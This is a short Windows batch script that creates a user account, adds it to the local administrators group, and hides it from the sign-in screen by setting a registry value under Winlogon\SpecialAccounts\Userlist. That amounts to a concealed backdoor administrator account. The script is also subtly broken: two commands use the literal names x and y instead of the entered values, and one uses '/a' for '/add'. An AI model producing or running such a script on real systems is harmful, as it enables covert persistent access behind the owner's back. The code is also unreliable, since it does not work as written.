@echo off
set /p x=please enter username:
set /p y=please enter the password for username:
net user x y /add
net localgroup administrators x /a
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\Userlist" /v %x% /t REG_DWORD /d 0
pause
